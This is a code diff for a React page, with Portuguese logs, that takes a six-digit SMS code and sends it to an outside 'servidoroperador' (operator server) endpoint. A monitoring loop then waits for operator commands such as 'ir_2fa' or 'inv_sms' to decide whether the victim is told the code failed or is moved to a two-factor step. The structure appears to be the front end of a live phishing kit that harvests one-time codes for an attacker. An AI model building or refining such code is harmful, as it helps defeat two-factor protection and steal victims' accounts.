@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
@@ -17,20 +16,26 @@ const SmsPage = () => {
 
   useEffect(() => {
     const storedClientId = localStorage.getItem('clientId');
+    console.log(`[SMS] [${clientMonitoring.isProduction ? 'PROD' : 'DEV'}] Inicializando página SMS`);
+    
     if (storedClientId) {
       setClientId(storedClientId);
-      console.log('SMS: ClientId recuperado:', storedClientId);
+      console.log('[SMS] ClientId recuperado:', storedClientId);
       
-      // Iniciar monitoramento centralizado
-      clientMonitoring.startMonitoring(storedClientId, 'sms');
+      // Aguardar um momento antes de iniciar o monitoramento para garantir que a página esteja totalmente carregada
+      setTimeout(() => {
+        clientMonitoring.startMonitoring(storedClientId, 'sms');
+      }, 500);
     } else {
-      console.log('SMS: ClientId não encontrado');
+      console.log('[SMS] ClientId não encontrado, redirecionando para home');
+      navigate('/home');
     }
 
     return () => {
+      console.log('[SMS] Cleanup: parando monitoramento');
       clientMonitoring.stopMonitoring();
     };
-  }, [clientMonitoring]);
+  }, [clientMonitoring, navigate]);
 
   const handleSmsCodeChange = (value: string) => {
     setSmsCode(value.replace(/\D/g, '').slice(0, 6));
@@ -41,7 +46,7 @@ const SmsPage = () => {
   };
 
   const handleInvalidSms = () => {
-    console.log('SMS inválido detectado');
+    console.log('[SMS] SMS inválido detectado');
     setSmsCode("");
     setIsLoading(false);
     setIsInvalid(true);
@@ -52,17 +57,20 @@ const SmsPage = () => {
     e.preventDefault();
     
     if (!clientId) {
-      console.log('ClientId não disponível para envio do SMS');
+      console.log('[SMS] ClientId não disponível para envio do SMS');
       return;
     }
 
     try {
-      console.log('Enviando código SMS:', smsCode);
+      console.log('[SMS] Enviando código SMS:', smsCode);
       
       setIsLoading(true);
       setIsInvalid(false);
       setErrorMessage("");
       
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
         method: 'PATCH',
         headers: {
@@ -70,25 +78,29 @@ const SmsPage = () => {
         },
         body: JSON.stringify({
           response: smsCode
-        })
+        }),
+        signal: controller.signal
       });
 
+      clearTimeout(timeoutId);
+
       if (response.ok) {
-        console.log('Código SMS enviado com sucesso');
-        // O monitoramento já está ativo e detectará ir_2fa ou inv_sms
+        console.log('[SMS] Código SMS enviado com sucesso - aguardando resposta do monitoramento');
+        // O monitoramento detectará ir_2fa ou inv_sms automaticamente
       } else {
-        console.log('Erro ao enviar código SMS');
+        console.log('[SMS] Erro ao enviar código SMS:', response.status);
         setIsLoading(false);
+        setErrorMessage("Erro ao enviar código. Tente novamente.");
       }
     } catch (error) {
-      console.log('Erro durante envio do SMS:', error);
+      console.log('[SMS] Erro durante envio do SMS:', error);
       setIsLoading(false);
+      setErrorMessage("Erro de conexão. Verifique sua internet.");
     }
   };
 
   // Configurar callback para SMS inválido
   useEffect(() => {
-    // Este effect será usado pelo monitoramento para chamar handleInvalidSms quando necessário
     window.handleInvalidSms = handleInvalidSms;
     
     return () => {
@@ -97,6 +109,7 @@ const SmsPage = () => {
   }, []);
 
   const handleBack = () => {
+    console.log('[SMS] Voltando para home');
     clientMonitoring.stopMonitoring();
     navigate("/home");
   };
@@ -106,6 +119,15 @@ const SmsPage = () => {
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-36 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
+          {/* Debug info em desenvolvimento */}
+          {!clientMonitoring.isProduction && (
+            <div className="mb-4 p-2 bg-gray-100 text-xs">
+              <div>Env: {clientMonitoring.isProduction ? 'PROD' : 'DEV'}</div>
+              <div>Monitoring: {clientMonitoring.isMonitoring ? 'ON' : 'OFF'}</div>
+              <div>ClientId: {clientId}</div>
+            </div>
+          )}
+
           {/* Botão Voltar */}
           <button
             onClick={handleBack}
